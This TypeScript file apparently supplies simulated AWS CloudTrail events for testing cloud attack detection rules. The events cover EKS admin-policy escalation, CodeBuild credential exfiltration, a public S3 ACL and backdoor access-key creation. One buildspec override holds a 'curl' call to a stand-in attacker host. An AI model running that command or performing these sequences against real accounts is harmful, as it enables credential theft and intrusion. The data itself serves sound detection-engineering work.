/**
 * Curated datasets for Detection Lab.
 * Simulated cloud attack telemetry for testing detection rules.
 */

export interface DatasetMetadata {
  id: string;
  name: string;
  technique: string;
  description: string;
  expectedDetections: string[];
  expectedFields: string[];
}

export interface Dataset {
  id: string;
  metadata: DatasetMetadata;
  events: Record<string, unknown>[];
}

const eksAccessEntryEvents: Record<string, unknown>[] = [
  {
    eventVersion: "1.08",
    eventSource: "eks.amazonaws.com",
    eventName: "CreateAccessEntry",
    eventTime: "2025-02-10T12:45:00Z",
    userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker", principalId: "AIDAEXAMPLE" },
    requestParameters: { clusterName: "prod-cluster", principalArn: "arn:aws:iam::123456789012:user/attacker" },
    sourceIPAddress: "203.0.113.10",
  },
  {
    eventVersion: "1.08",
    eventSource: "eks.amazonaws.com",
    eventName: "AssociateAccessPolicy",
    eventTime: "2025-02-10T12:45:05Z",
    userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker", principalId: "AIDAEXAMPLE" },
    requestParameters: {
      clusterName: "prod-cluster",
      principalArn: "arn:aws:iam::123456789012:user/attacker",
      policyArn: "arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy",
      accessScope: { type: "cluster" },
    },
    sourceIPAddress: "203.0.113.10",
  },
];

const codebuildExfilEvents: Record<string, unknown>[] = [
  {
    eventVersion: "1.08",
    eventSource: "codebuild.amazonaws.com",
    eventName: "StartBuild",
    eventTime: "2025-02-10T12:50:00Z",
    userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" },
    requestParameters: {
      projectName: "sensitive-project",
      buildspecOverride: "version: 0.2\nphases:\n  build:\n    commands:\n      - curl http://attacker.com/exfil",
    },
    sourceIPAddress: "203.0.113.10",
  },
  {
    eventVersion: "1.08",
    eventSource: "secretsmanager.amazonaws.com",
    eventName: "GetSecretValue",
    eventTime: "2025-02-10T12:50:15Z",
    userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/CodeBuildServiceRole/session" },
    requestParameters: { secretId: "prod/db/credentials" },
    sourceIPAddress: "10.0.1.50",
  },
];

const s3AclPersistenceEvents: Record<string, unknown>[] = [
  {
    eventVersion: "1.08",
    eventSource: "s3.amazonaws.com",
    eventName: "PutBucketAcl",
    eventTime: "2025-02-10T12:55:00Z",
    userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" },
    requestParameters: { bucketName: "sensitive-data-bucket", acl: "public-read" },
    sourceIPAddress: "203.0.113.10",
  },
];

const iamAccessKeyEvents: Record<string, unknown>[] = [
  {
    eventVersion: "1.08",
    eventSource: "iam.amazonaws.com",
    eventName: "CreateAccessKey",
    eventTime: "2025-02-10T13:00:00Z",
    userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/aws-elasticbeanstalk-ec2-role/session" },
    requestParameters: { userName: "backdoor-user" },
    sourceIPAddress: "10.0.1.100",
  },
];

const beanstalkConfigEvents: Record<string, unknown>[] = [
  {
    eventVersion: "1.08",
    eventSource: "elasticbeanstalk.amazonaws.com",
    eventName: "DescribeConfigurationSettings",
    eventTime: "2025-02-10T13:05:00Z",
    userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" },
    requestParameters: { applicationName: "prod-app", environmentName: "prod-env" },
    sourceIPAddress: "203.0.113.10",
  },
  {
    eventVersion: "1.08",
    eventSource: "iam.amazonaws.com",
    eventName: "CreateAccessKey",
    eventTime: "2025-02-10T13:05:30Z",
    userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" },
    requestParameters: { userName: "attacker" },
    sourceIPAddress: "203.0.113.10",
  },
];

export const datasets: Dataset[] = [
  {
    id: "eks_access_entry_creation",
    metadata: {
      id: "eks_access_entry_creation",
      name: "EKS Access Entry Creation",
      technique: "EKS Create Access Entry",
      description: "Simulated EKS access entry creation and policy association for privilege escalation.",
      expectedDetections: ["det-096", "det-097", "det-098", "det-099"],
      expectedFields: ["eventSource", "eventName", "requestParameters.clusterName", "requestParameters.principalArn"],
    },
    events: eksAccessEntryEvents,
  },
  {
    id: "codebuild_credential_exfiltration",
    metadata: {
      id: "codebuild_credential_exfiltration",
      name: "CodeBuild Credential Exfiltration",
      technique: "CodeBuild Environment Credential Theft",
      description: "Simulated CodeBuild StartBuild with buildspec override followed by GetSecretValue.",
      expectedDetections: ["det-126", "det-127", "det-129"],
      expectedFields: ["eventSource", "eventName", "requestParameters.buildspecOverride", "requestParameters.projectName"],
    },
    events: codebuildExfilEvents,
  },
  {
    id: "s3_acl_persistence",
    metadata: {
      id: "s3_acl_persistence",
      name: "S3 ACL Persistence",
      technique: "S3 ACL Persistence",
      description: "Simulated PutBucketAcl with public-read grant.",
      expectedDetections: ["det-131", "det-132", "det-133"],
      expectedFields: ["eventSource", "eventName", "requestParameters.bucketName", "requestParameters.acl"],
    },
    events: s3AclPersistenceEvents,
  },
  {
    id: "iam_access_key_creation",
    metadata: {
      id: "iam_access_key_creation",
      name: "IAM Access Key Creation",
      technique: "Beanstalk Credential Pivot",
      description: "Simulated CreateAccessKey by Beanstalk instance role (credential pivot).",
      expectedDetections: ["det-118", "det-121"],
      expectedFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.userName"],
    },
    events: iamAccessKeyEvents,
  },
  {
    id: "beanstalk_configuration_theft",
    metadata: {
      id: "beanstalk_configuration_theft",
      name: "Beanstalk Configuration Theft",
      technique: "Elastic Beanstalk Environment Credential Theft",
      description: "Simulated DescribeConfigurationSettings followed by CreateAccessKey.",
      expectedDetections: ["det-122", "det-123", "det-125"],
      expectedFields: ["eventSource", "eventName", "requestParameters.applicationName", "requestParameters.environmentName"],
    },
    events: beanstalkConfigEvents,
  },
];

export function getDatasetById(id: string): Dataset | undefined {
  return datasets.find((d) => d.id === id);
}
